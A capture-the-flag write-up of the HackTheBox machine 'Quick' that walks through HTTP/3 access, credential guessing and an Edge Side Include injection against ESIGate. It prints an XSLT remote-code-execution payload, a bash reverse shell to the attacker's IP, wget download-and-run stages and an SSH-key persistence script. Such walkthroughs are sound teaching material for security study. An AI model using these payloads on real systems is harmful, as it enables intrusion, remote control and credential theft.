---
title: HTB: Quick
url: https://0xdf.gitlab.io/2020/08/29/htb-quick.html
date: 2020-08-29T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-quick, hackthebox, ctf, nmap, ubuntu, gobuster, vhosts, wfuzz, quic, http3, curl, edgeside-include-injection, esi, injection, race-condition, cracking, python, credentials, su, oscp-plus-v2, oscp-plus-v3
---

![Quick](https://0xdfimages.gitlab.io/img/quick-cover.png)

Quick was a chance to play with two technologies that I was familiar with, but I had never put hands on with either. First it was finding a website hosted over Quic / HTTP version 3. I’ll build curl so that I can access that, and find creds to get into a ticketing system. In that system, I will exploit an edge side include injection to get execution, and with a bit more work, a shell. Next I’ll exploit a new website available on localhost and take advantage of a race condition that allows me to read and write arbitrary files as the next user. Finally, to get root I’ll find creds in a cached config file. In Beyond Root, I’ll use a root shell to trouble-shoot my difficulties getting a shell and determine where things were breaking.

## Box Info

| Name | [Quick](https://hackthebox.com/machines/quick)  [Quick](https://hackthebox.com/machines/quick) [Play on HackTheBox](https://hackthebox.com/machines/quick) |
| --- | --- |
| Release Date | [25 Apr 2020](https://twitter.com/hackthebox_eu/status/1253290821874565120) |
| Retire Date | 29 Aug 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Quick |
| Radar Graph | Radar chart for Quick |
| First Blood User | 01:58:13[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 02:57:12[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (9001):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.186
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 14:03 EDT
Nmap scan report for 10.10.10.186
Host is up (0.016s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
9001/tcp open  tor-orport

Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
root@kali# nmap -p 22,9001 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.186
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 14:04 EDT
Nmap scan report for 10.10.10.186
Host is up (0.014s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Quick | Broadband Services
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.91 seconds
root@kali# nmap -p- -sU --min-rate 10000 -oA scans/nmap-alludp 10.10.10.186                                                                                                                                
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 14:28 EDT
Warning: 10.10.10.186 giving up on port because retransmission cap hit (10).
Nmap scan report for quick.htb (10.10.10.186)
Host is up (0.050s latency).
All 65535 scanned ports on quick.htb (10.10.10.186) are open|filtered (65457) or closed (78)

Nmap done: 1 IP address (1 host up) scanned in 73.42 seconds

```

It didn’t identify any UDP ports, but `nmap` is always unreliable with UDP, and I’ll show that to be the case shortly.

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 18.04 Bionic.

### Website - TCP 9001

#### Site

The site is for an ISP:

[![image-20200430141024866](https://0xdfimages.gitlab.io/img/image-20200430141024866.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200430141024866.png)

There a few interesting links from the page:
- “clients” at the bottom goes to `/clients.php`.
- “Get Started” button is a link to `/login.php`.
- “portal” in the Update section is a link to `https://portal.quick.htb`.

The last one is particularly interesting since typically a browser would read that as visiting that host on TCP 443, which wasn’t open on this host.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://10.10.10.186:9001 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30 -o scans/gobuster-ip-root-medium-php                                      
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.186:9001
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/30 14:15:02 Starting gobuster
===============================================================
/index.php (Status: 200)
/search.php (Status: 200)
/home.php (Status: 200)
/login.php (Status: 200)
/clients.php (Status: 200)
/db.php (Status: 200)
/ticket.php (Status: 200)
/server-status (Status: 200)
/%3FRID%3D2671 (Status: 200)
/%3FRID%3D2671.php (Status: 200)
===============================================================
2020/04/30 14:33:30 Finished
===============================================================

```

It does identify new pages, but nothing valuable yet:
- `search.php` and `db.php` both return empty, likely used by other pages.
- `home.php` and `ticket.php` both respond “Invalid Username/Password” and redirect to `login.php`.
- `server-status` is not 403, which is unusual. Still it didn’t give me anything I found useful at this point.
- The last two are FPs that just show `index.php`.

#### /clients.php

This page returns a list of the clients:

![image-20200501111215675](https://0xdfimages.gitlab.io/img/image-20200501111215675.png)

#### /login.php

This page presents a login form:

![image-20200430141822536](https://0xdfimages.gitlab.io/img/image-20200430141822536.png)

Nothing obvious either in guessing or in SQLi worked, so moving on for now.

### Virtual Hosts

Given the link above, I’ll add both `portal.quick.htb` and `quick.htb` to my `/etc/hosts` file. I’ll also use `wfuzz` to look for more with the following command:

```

wfuzz -c -u http://10.10.10.186:9001 -H "Host: FUZZ.quick.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 3351

```

It didn’t find anything.

### Website - UDP 443

#### QUIC Background

The only lead left is the link to `https://portal.quick.htb`. Visiting that site in Firefox fails to connect.

This is where some knowledge of new tech is useful. While most standard HTTP today is version 1.1 ([standardized](https://tools.ietf.org/html/rfc2068) in 1997), there has been a push to move to more modern protocols. HTTP/2 was proposed in 2014 and released as a [standard](https://tools.ietf.org/html/rfc7540) in 2015. In 2012, Google created [QUIC](https://en.wikipedia.org/wiki/QUIC), a general purpose transport layer protocol. [This post](https://blog.apnic.net/2019/03/04/a-quick-look-at-quic/) from APNIC was a useful overview, and included these two images that show how QUIC compares to typical HTTPS over TCP:

![img](https://0xdfimages.gitlab.io/img/quic-fig1.png)

![img](https://0xdfimages.gitlab.io/img/quic-fig2.png)

#### Building Curl

Unfortunately, at the time the Quick box was released, not many tools on Kali support QUIC by default. I ended up using `curl`, using these [instruction for building from source](https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version). I followed the section on `quiche version` and it worked. There were a couple times something would throw an error, and I’d have to go `apt install` something, but for the most part, it was smooth. Once I was done, there was a `curl` alternative located at `/opt/curl/src/curl`.

#### Website

Luckily the website is pretty simple, and I can get what I need with `curl`. Hitting the main page with this new `curl` run as `/opt/curl/src/curl --http3 https://portal.quick.htb/` works:

```

<html>
<title> Quick | Customer Portal</title>
<h1>Quick | Portal</h1>
<head>
<style>
ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 200px;
  background-color: #f1f1f1;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

/* Change the link color on hover */
li a:hover {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>
<p> Welcome to Quick User Portal</p>
<ul>
  <li><a href="index.php">Home</a></li>
  <li><a href="index.php?view=contact">Contact</a></li>
  <li><a href="index.php?view=about">About</a></li>
  <li><a href="index.php?view=docs">References</a></li>
</ul>
</html>

```

There are three links to visit. `view=contact` contains a form:

```

<body>
<h1>Quick | Contact</h1>

<div class="container">
  <form action="/">
    <label for="fname">First Name</label>
    <input type="text" id="fname" name="firstname" placeholder="Your name..">

    <label for="lname">Last Name</label>
    <input type="text" id="lname" name="lastname" placeholder="Your last name..">

    <label for="country">Country</label>
    <select id="country" name="country">
      <option value="australia">Australia</option>
      <option value="canada">Canada</option>
      <option value="usa">USA</option>
    </select>

    <label for="subject">Subject</label>
    <textarea id="subject" name="subject" placeholder="Write something.." style="height:200px"></textarea>

    <input type="submit" value="Submit">
  </form>
</div>

</body>

```

I played with submitting data to it, but never got anything different out of `index.php`.

`view=about` has some info about people, which could be useful later:

```

<body>

<div class="about-section">
  <h1>Quick | About Us </h1>
</div>

<h2 style="text-align:center">Our Team</h2>
<div class="row">
  <div class="column">
    <div class="card">
      <img src="/w3images/team1.jpg" alt="Jane" style="width:100%">
      <div class="container">
        <h2>Jane Doe</h2>
        <p class="title">CEO & Founder</p>
        <p>Quick Broadband services established in 2012 by Jane.</p>
        <p>jane@quick.htb</p>
      </div>
    </div>
  </div>

  <div class="column">
    <div class="card">
      <img src="/w3images/team2.jpg" alt="Mike" style="width:100%">
      <div class="container">
        <h2>Mike Ross</h2>
        <p class="title">Sales Manager</p>
        <p>Manages the sales and services.</p>
        <p>mike@quick.htb</p>
      </div>
    </div>
  </div>
  
  <div class="column">
    <div class="card">
      <img src="/w3images/team3.jpg" alt="John" style="width:100%">
      <div class="container">
        <h2>John Doe</h2>
        <p class="title">Web Designer</p>
        <p>Front end developer.</p>
        <p>john@quick.htb</p>
      </div>
    </div>
  </div>
</div>

</body>

```

`view=docs` gives two more links:

```

<h1>Quick | References</h1>
<ul>
  <li><a href="docs/QuickStart.pdf">Quick-Start Guide</a></li>
  <li><a href="docs/Connectivity.pdf">Connectivity Guide</a></li>
</ul>

```

I’ll grab both with the following commands:

```

root@kali# /opt/curl/src/curl -s --http3 https://portal.quick.htb/docs/QuickStart.pdf > QuickStart.pdf
root@kali# /opt/curl/src/curl -s --http3 https://portal.quick.htb/docs/Connectivity.pdf > Connectivity.pdf

```

I tried some directory traversal attacks, and tried to get the PHP source using filters, but neither worked.

`QuickStart.pdf` didn’t seem to have anything useful, but `Connectivity.pdf` did:

![image-20200501111038593](https://0xdfimages.gitlab.io/img/image-20200501111038593.png)

## Shell as sam

### Panel Login

I’ll use the password I found in the PDF above to try to log into the TCP 9001 site. I tried the email addresses from the about page on the QUIC site, but it didn’t work. Since this is a client login, I remembered the testimonials on the front page, which were from:
- Tim (Qconsulting Pvt Ltd)
- Roy (DarkWng Solutions)
- Elisa (Wink Media)
- James (LazyCoop Pvt Ltd)

I also have the countries for each of these from `clients.php`:

| # | Client | Country |
| --- | --- | --- |
| 1 | QConsulting Pvt Ltd | UK |
| 2 | Darkwing Solutions | US |
| 3 | Wink | UK |
| 4 | LazyCoop Pvt Ltd | China |
| 5 | ScoobyDoo | Italy |
| 6 | PenguinCrop | France |

After a ton of guessing around, I found a valid login combining the company name and the location: `elisa@wink.co.uk` / `Quick4cc3$$`.

### Ticket System Enumeration

#### General

It’s important to visit the site at `quick.htb` and not by IP, as some functionality breaks otherwise.

Once logged in, there’s a dashboard for the “Quick | Ticketing System”.

![image-20200506070221290](https://0xdfimages.gitlab.io/img/image-20200506070221290.png)

The only two functional elements on the page that I could find were the search button and the Raise Ticket link.

#### Raise Ticket

Raise Ticket leads to a form:

![image-20200506070742241](https://0xdfimages.gitlab.io/img/image-20200506070742241.png)

Submitting some test data returns a JavaScript alert:

![image-20200506070827343](https://0xdfimages.gitlab.io/img/image-20200506070827343.png)

Looking at the POST request, it submits not only `title` and `msg`, but also `id`:

```

POST /ticket.php HTTP/1.1
Host: 10.10.10.186:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.186:9001/ticket.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Connection: close
Cookie: PHPSESSID=a09rqm19lifeaaubgj50mgu3p5
Upgrade-Insecure-Requests: 1

title=test&msg=Describe+your+query&id=TKT-4076

```

It looks like when I GET `ticket.php`, the `id` for the new ticket is sent down as a hidden field in the form. As far as I can tell, the four digit number is completely random.

The response contains only the `<script>` tag, as is common on boxes by MrR3boot:

```

HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Via: 1.1 localhost (Apache-HttpClient/4.5.2 (cache))
X-Powered-By: Esigate
Content-Length: 131
Connection: close

<script>alert("Ticket NO : \"TKT-4076\" raised. We will answer you as soon as possible");window.location.href="/home.php";</script>

```

#### Search

Entering text into the text box and hitting enter does nothing, but clicking on Search, while it appears like nothing happens on the page, does generate a POST request:

```

GET /search.php?search=7261 HTTP/1.1
Host: quick.htb:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://quick.htb:9001/home.php
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: PHPSESSID=uhaaq6hi3c631p92ms8285g564

```

On searching for the digits in a ticket I created, I get a table:

```

HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Via: 1.1 localhost (Apache-HttpClient/4.5.2 (cache))
X-Powered-By: Esigate
Content-Length: 395
Connection: close

<br /><br /><table border="2" width="100%"><tr><td style="font-size:180%;">ID</td><td style="font-size:180%;">Title</td><td style="font-size:180%;">Description</td><td style="font-size:180%;">Status</td></tr><tr><td style="font-size:180%;">TKT-7261</td><td style="font-size:180%;">sadfas</td><td style="font-size:180%;">Describe your query</td><td style="font-size:180%;">open</td></tr></table>

```

And it shows up on the page:

![image-20200506171844499](https://0xdfimages.gitlab.io/img/image-20200506171844499.png)

#### ESI

One other thing I noticed in all the responses coming back is a pair of headers:

```

Via: 1.1 localhost (Apache-HttpClient/4.5.2 (cache))
X-Powered-By: Esigate

```

ESIGate devices are surrogates that handle caching of content and support the ESI web standard. The [Via header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Via) is added by proxies. Based on this, I can assume that Esigate is running on localhost doing this ESI proxying.

### Edge Side Include Injection

#### Background

Edge-Side Include (ESI) is a web standard that allows an edge device to cache a page with some static content. [This blog](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) uses the example of a weather page that might look like this:

```

<body>
  <b>The Weather Website</b>
  Weather for <esi:include src="/weather/name?id=$(QUERY_STRING{city_id})" />
  Monday: <esi:include src="/weather/week/monday?id=$(QUERY_STRING{city_id})" />
  Tuesday: <esi:include src="/weather/week/tuesday?id=$(QUERY_STRING{city_id})" />
[…]

```

So the edge caching device would cache the page just like this. And when someone requests the page, it will replace the `<esi:include>` tags by making the necessary calls itself.

The risk here is that if an attacker can submit something that will be processed by the server, and result in an ESI tag included in the response, the edge device will then process that and make the requests that the attacker wanted, as the edge device thinks it’s coming from the web server. The blog post above shows how this can be used for server-side request forgery (SSRF), bypassing client-side cross site scripting (XSS) filters, and (in the second post) using XSLT to get code execution. The example used for the last one is against ESIGate devices!

#### Configure Apache

I always use `python3 -m http.server 80` to serve files from my host, but there are some things that get wonky here, and I found it easier to use Apache. To start Apache on Kali, all I had to run was `service apache2 restart`. I didn’t want Apache to send 304 responses (content not modified), so I disabled that by putting the following at the bottom of `/etc/apache2/apache2.conf`:

```

RequestHeader unset Last-Modified
RequestHeader unset If-None-Match
RequestHeader unset If-Modified-Since

```

When I then tried to restart Apache, I got an error message. The message said to run `systemctl status apache2.service` for more details:

```

root@kali# systemctl status apache2.service
● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
     Active: failed (Result: exit-code) since Wed 2020-05-06 10:29:17 EDT; 3s ago
       Docs: https://httpd.apache.org/docs/2.4/
    Process: 40687 ExecStart=/usr/sbin/apachectl start (code=exited, status=1/FAILURE)

May 06 10:29:17 kali systemd[1]: Starting The Apache HTTP Server...
May 06 10:29:17 kali apachectl[40690]: AH00526: Syntax error on line 229 of /etc/apache2/apache2.conf:
May 06 10:29:17 kali apachectl[40690]: Invalid command 'RequestHeader', perhaps misspelled or defined by a module not included in the server configuration
May 06 10:29:17 kali apachectl[40687]: Action 'start' failed.
May 06 10:29:17 kali apachectl[40687]: The Apache error log may have more information.
May 06 10:29:17 kali systemd[1]: apache2.service: Control process exited, code=exited, status=1/FAILURE
May 06 10:29:17 kali systemd[1]: apache2.service: Failed with result 'exit-code'.
May 06 10:29:17 kali systemd[1]: Failed to start The Apache HTTP Server.

```

Some Googling led me to the [solution](https://ycsoftware.net/invalid-command-requestheader-perhaps-misspelled-or-defined-by-a-module/), running `a2enmod headers`, and then restarting Apache.

Now I can drop files into `/var/www/html` and they are served.

One of the things I like about the Python server is seeing in real time when something makes a request. I simulated that by running `tail -f /var/log/apache2/access.log | cut -d' ' -f-9` in a tmux pane. Whenever there’s a connection, a new line spits out in that window. The `cut` is just to shorten the lines so that each line fits on one line (I don’t need the referrer or user-agent string).

If you choose not to use Apache, but rather want to stick with Python, the biggest issue is that it seems the second time the edge software requests a file, instead of sending a normal `GET /file HTTP/1.1`, it sends `GET http://10.10.14.47/file HTTP/1.1`. This breaks the Python web server. I can get around that by changing the name of the file or the port it is hosted on each time, but that’s a pain, and why I went with Apache.

#### Injection POC

To pull this off, I have to think about what content I can submit to this page that might be sent back to me through the edge. There are two places I could think of:
1. When I submit a ticket, I send in the ticket ID, and it is displayed right back to me in the JavaScript alert.
2. The ID, status, title, and message are stored and displayed back to me when I search for them on the front page.

I went into Burp and sent the POST request to create a ticket to Burp. I submitted the following POST body:

```

title=test&msg=test&id=TKT-7261<this is a test>

```

The response was perfect:

```

<script>alert("Ticket NO : \"TKT-7261<this is a test>\" raised. We will answer you as soon as possible");window.location.href="/home.php";</script>

```

I can see the `<this is a test>` tags perfectly intact. That means that the edge device would have seen this and processed it. To test, I created `poc.html`:

```

<b>0xdf was here</b>

```

Then in Repeater, I submitted:

```

title=test&msg=test&id=TKT-7261<esi:include src="http://10.10.14.47/poc.html" />

```

If the experiment works, the edge device will see the ESI tag, reach out to my box and get `poc.html`, and put the contents in place of the tag.

On submitting, I get a log from Apache:

```
10.10.10.186 - - [06/May/2020:17:51:11 -0400] "GET /poc.html HTTP/1.1" 200

```

And the response has the content:

```

<script>alert("Ticket NO : \"TKT-72610<b>0xdf was here</b>
\" raised. We will answer you as soon as possible");window.location.href="/home.php";</script>

```

The alternative place to try this would be in the message body or title. For example, I’ll submit a ticket like this:

```

title=test&msg=<esi:include src="http://10.10.14.47/poc.html" />&id=TKT-7264

```

Now when I search for it:

![image-20200506175926496](https://0xdfimages.gitlab.io/img/image-20200506175926496.png)

#### XSLT to RCE POC

To get RCE, I’ll include an ESI tag that looks like this:

```

<esi:include src="http://localhost/" stylesheet="http://10.10.14.47/esi.xsl">
</esi:include>

```

The first argument, `src` can be anything, but it has to resolve. Both `localhost` and `10.10.14.47` work. The second is the XSLT I’m going to load.

`esi.xsl` contains Java to run a command. In my first test, it’s a `ping` that I can listen for with `tcpdump`:

```

<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[ping -c 2 10.10.14.47]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>

```

When I send the following ticket creation:

```

POST /ticket.php HTTP/1.1
Host: quick.htb:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://quick.htb:9001/ticket.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Connection: close
Cookie: PHPSESSID=uhaaq6hi3c631p92ms8285g564
Upgrade-Insecure-Requests: 1

title=0xdf&msg=Describe+your+query&id=TKT-5508;<esi:include src="http://localhost/" stylesheet="http://10.10.14.47/esi.xsl">
</esi:include>

```

I see it hit my Apache server (note the unusually request including the protocol and ip):

```
10.10.10.186 - - [06/May/2020:18:18:27 -0400] "GET http://10.10.14.47/esi.xsl HTTP/1.1" 200

```

And then pings in `tcpdump`:

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
18:18:28.039806 IP 10.10.10.186 > 10.10.14.47: ICMP echo request, id 6885, seq 1, length 64
18:18:28.039845 IP 10.10.14.47 > 10.10.10.186: ICMP echo reply, id 6885, seq 1, length 64
18:18:29.040770 IP 10.10.10.186 > 10.10.14.47: ICMP echo request, id 6885, seq 2, length 64
18:18:29.040810 IP 10.10.14.47 > 10.10.10.186: ICMP echo reply, id 6885, seq 2, length 64

```

#### Shell

I tried a lot of ways to get a shell. I found very quickly that I could use single commands, but that anything involving a `|` or `&` doesn’t work. I’ll explore why in [Beyond Root](#beyond-root). But having figured that out through a lot of trial and error, I used a multi-stage approach. I created a simple reverse shell, `shell`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.47/443 0>&1

```

Then I created two `.xsl` files, one that will upload the shell, and then one that will run it (using `grep` to just show the command part of the file below):

```

root@kali# grep CDATA /var/www/html/shell*
shellup.xsl:<xsl:variable name="cmd"><![CDATA[wget http://10.10.14.47/shell -O /tmp/a.sh]]></xsl:variable>
shellrun.xsl:<xsl:variable name="cmd"><![CDATA[bash /tmp/a.sh]]></xsl:variable>

```

In Repeater, I send:

```

title=0xdf&msg=Describe+your+query&id=TKT-5508;<esi:include src="http://localhost/" stylesheet="http://10.10.14.47/shellup.xsl">
</esi:include>

```

And then:

```

title=0xdf&msg=Describe+your+query&id=TKT-5508;<esi:include src="http://localhost/" stylesheet="http://10.10.14.47/shellrun.xsl">
</esi:include>

```

I get a shell:

```

root@kali# nc -lnvp 443                                                    
Ncat: Version 7.80 ( https://nmap.org/ncat )         
Ncat: Listening on :::443                            
Ncat: Listening on 0.0.0.0:443                       
Ncat: Connection from 10.10.10.186.                  
Ncat: Connection from 10.10.10.186:55506.            
bash: cannot set terminal process group (931): Inappropriate ioctl for device                              
bash: no job control in this shell                   
sam@quick:~$

```

And grab `user.txt`:

```

sam@quick:~$ cat user.txt
b23772cd************************

```

## Priv: sam –> srvadm

### General Enumeration

Right away I see there are two users on the box:

```

sam@quick:~$ ls /home
sam  srvadm

```

I’ll keep an eye out for ways to pivot to srvadm. Taking a look at the process list (`ps auxww`) was a good way to see various parts of the box running. There’s ESIGate software, running as sam:

```

sam        1073  0.3  9.0 3718872 364952 ?      Sl   May06   5:11 /usr/bin/java -Desigate.config=/home/sam/esigate-distribution-5.2/apps/esigate.properties -Dserver.port=9001 -jar /home/sam/esigate-distribution-5.2/apps/esigate-server.jar start

```

There’s a docker container with proxy set to forward udp 443 to it:

```

root       1831  0.0  0.0 404800  3772 ?        Sl   May06   0:00 /usr/bin/docker-proxy -proto udp -host-ip 0.0.0.0 -host-port 443 -container-ip 172.18.0.2 -container-port 443
root       1845  0.0  0.1  10772  5608 ?        Sl   May06   0:01 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/d63025c3f05b572471c86c790059b05f36c75fc90d975cb19288d5bc88d238ee -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
root       1846  0.0  0.1   9364  5844 ?        Sl   May06   0:01 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/f78e2c79d2db3e029679c14060e7dcab4ffbba2167c107a7677f81024e8bc875 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc

```

The Apache configuration shows two virtual hosts enabled on TCP 80 in `/etc/apache2/sites-enabled/000-default.conf` (comments removed):

```

<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
        AssignUserId srvadm srvadm
        ServerName printerv2.quick.htb
        DocumentRoot /var/www/printer
</VirtualHost>

```

The top block is the site I’ve been interacting with. But the bottom one is new. It’s also running as srvadm.

### Accessing Printer Site

I’ll add `printerv2.quick.htb` to `/etc/hosts`, but I still can’t connect to it on TCP 80 or 9001. Since I know that the ESIGate is listening on 9001 and forwarding to `http://localhost:80` from the config file from the process list:

```

sam@quick:~$ cat esigate-distribution-5.2/apps/esigate.properties 
esigate.remoteUrlBase=http://localhost:80/
esigate.mappings=/*

```

It’s possible that ESI isn’t letting things through with the right vhost? Either way, I’ll want to tunnel to get to this vhost on localhost port 80. I’ll create a `.ssh` directory in sam’s homedir, and drop my public key into `authorized keys`. Because I got tired of doing this each time I walked away, I created two `.xsl` files that will create the directory and then upload my key into `authorized_keys`:

```

root@kali# grep CDATA ssh*
ssh1.xsl:<xsl:variable name="cmd"><![CDATA[mkdir -p /home/sam/.ssh]]></xsl:variable>
ssh2.xsl:<xsl:variable name="cmd"><![CDATA[wget http://10.10.14.47/id_rsa_generated.pub -O /home/sam/.ssh/authorized_keys]]></xsl:variable>

```

Then I wrote a `bash` script that will login, post the two files, then connect over SSH with a tunnel from my local box 9001 to 80 on Quick:

```

#!/bin/bash

COOKIEJAR=$(mktemp)

curl -s http://quick.htb:9001/login.php -d 'email=elisa%40wink.co.uk&password=Quick4cc3%24%24' --cookie-jar $COOKIEJAR
curl --cookie $COOKIEJAR -s http://quick.htb:9001/ticket.php -d 'title=0xdf&msg=Describe+your+query&id=TKT-5508;<esi:include src="http://localhost/" stylesheet="http://10.10.14.47/ssh1.xsl"></esi:include>' > /dev/ null
curl --cookie $COOKIEJAR -s http://quick.htb:9001/ticket.php -d 'title=0xdf&msg=Describe+your+query&id=TKT-5508;<esi:include src="http://localhost/" stylesheet="http://10.10.14.47/ssh2.xsl"></esi:include>' > /dev/ null

rm $COOKIEJAR

ssh -i ~/keys/id_rsa_generated sam@10.10.10.186 -L 9001:localhost:80

```

Running this presents an SSH session as SAM, and more importantly, there’s now a tunnel to the printer site. I’ll update `/etc/hosts` to have `printerv2.quick.htb` point to localhost, and visit `http://printerv2.quick.htb:9001/` and get the page:

![image-20200508103558692](https://0xdfimages.gitlab.io/img/image-20200508103558692.png)

### Get Login

#### Enumerate Form

As I already have a shell, I can look at what the site requires to login. Trying to login submits a POST to `index.php`, which is handled here:

```

<?php                   
include("db.php");                                   
if(isset($_POST["email"]) && isset($_POST["password"]))                                                    
{                               
        $email=$_POST["email"];    
        $password = $_POST["password"];                                                                    
        $password = md5(crypt($password,'fa'));                                                            
        $stmt=$conn->prepare("select email,password from users where email=? and password=?");
        $stmt->bind_param("ss",$email,$password);                                                          
        $stmt->execute();                            
        $result = $stmt->get_result();      
        $num_rows = $result->num_rows;
        if($num_rows > 0 && $email === "srvadm@quick.htb")
        {
                session_start();                     
                $_SESSION["loggedin"]=$email;
                header("location: home.php");
        }                                                                                                  
        else                                                                                               
        {                                                                                                  
                echo '<script>alert("Invalid Credentials");window.location.href="/index.php";</script>';
        }
}                                                   
else                        
{?>
...[snip login form html]...

```

The password is first passed to `crypt`, then the result is passed to `md5`, and that is compared to what’s in the database.

#### Dump Hash

`db.php` has the creds to connect to the database:

```

<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>

```

I can connect and dump the users table:

```

sam@quick:/var/www/printer$ mysql -u db_adm -pdb_p4ss quick
...[snip]...
mysql> select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)

```

#### Verify PHP and Python

I can pull up a PHP terminal (`php -a`)and test Elisa’s password, since I know it. According to [the documentation](https://www.php.net/manual/en/function.crypt.php), `crypt` makes a DES-based hash that is 13 characters, with the first two being the salt.

```

php > echo crypt('Quick4cc3$$','fa');
faue2Hiwim8Bc

```

If I add the `md5` call, it makes an MD5, and it matches what’s in the database for elisa:

```

php > echo md5(crypt('Quick4cc3$$','fa'));
c6c35ae1f3cb19438e0199cfa72a9d9d

```

